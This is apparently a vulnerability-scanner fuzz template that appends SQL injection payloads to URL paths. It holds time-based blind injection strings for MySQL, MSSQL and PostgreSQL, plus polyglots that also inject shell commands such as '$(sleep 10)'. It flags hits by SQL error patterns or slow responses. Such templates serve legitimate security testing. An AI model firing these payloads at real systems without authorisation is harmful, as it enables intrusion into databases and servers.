id: sqli-path-fuzz-01
type: fuzz
info:
  name: SQL Injection on path 01
  risk: High


payloads:
  - >-
    '
  - >-
    -
  - >-
    %
  - >-
    \"
  - >-
    `
  - >-
    %25%27%25%22
  - >-
    %u0027%u0022
  - >-
    %c0%a7
  - >-
    %0aa%0db
  - >-
    1e309
  - >-
    char(0x27)char(0x27)
  - >-
    %u2018
  - >-
    /*
  - >-
    /**/ AND sleep(10)
  - >-
    ' AND sleep(10)
  - >-
    /**/ AND SLEEP(10) /*‘ or SLEEP(10) or ‘“ or SLEEP(10) or “*/
  - >-
    /**/ AND SLEEP(10) /*' or SLEEP(10) or '\" or SLEEP(10) or \"*/
  - >-
    /**/ AND IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR\"*/
  - >-
    'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR\"*/
  - >-
    /**/ AND if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'\"XOR(if(now()=sysdate(),sleep(10),0))OR\"*/
  - >-
    'if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'\"XOR(if(now()=sysdate(),sleep(10),0))OR\"*/
  - >-
    /**/ AND /*$(sleep 10)`sleep 10``*/-sleep(10)#'/*$(sleep 10)`sleep 10` #*/||sleep(10)||'\"||sleep(10)||\"`
  - >-
    '/*$(sleep 10)`sleep 10``*/-sleep(10)#'/*$(sleep 10)`sleep 10` #*/||sleep(10)||'\"||sleep(10)||\"`
  - >-
    /**/ AND /*$(sleep 10)`sleep 10``*/sleep(10)#'/*$(sleep 10)`sleep 10` #*/||sleep(10)||'\"||sleep(10)||\"`
  - >-
    '/*$(sleep 10)`sleep 10``*/sleep(10)#'/*$(sleep 10)`sleep 10` #*/||sleep(10)||'\"||sleep(10)||\"`
  - >-
    /**/ AND (select*from(select(sleep(7*7)))a)
  - >-
    ,(select*from(select(sleep(20)))a)
  - >-
    '(select*from(select(sleep(20)))a)--V
  - >-
    '(select*from(select(sleep(20)))a)'
  - >-
    '+(select*from(select(sleep(10)))a)+'
  - >-
    /**/ AND SLEEP(15)#
  - >-
    'xor(if(now()=sysdate(),sleep(10),0))or'
  - >-
    '; WAITFOR DELAY '0:0:13'--V
  - >-
    ' WAITFOR DELAY '0:0:13'--V
  - >-
    ' WAITFOR DELAY '0:0:13'
  - >-
    /**/ pg_sleep(30)--V
  - >-
    ||pg_sleep(30)--V
  - >-
    '||pg_sleep(10)--V


requests:
  - generators:
      - Path("[[.original]]{{.payload}}", "*")
    detections:
      - >-
        RegexSearch("response", "mysql_fetch_|not a valid MySQL|not a legal PLSQL identifer|mysql_connect\(\)|(SELECT\s+[^:>]+\sFROM\s+[^:>]+\sWHERE\s+)|(at\s[[:alnum:]\/\._]+\sline\s\d+)|ociparse\(\):|must be a syntactically valid variable|CFSQLTYPE|Unknown column '|Microsoft OLE DB Provider for SQL|SQL QUERY FAILURE:|Syntax error.{1,50}in query|You have an error in your SQL syntax|Unclosed quotation mark") || ResponseTime() > 8
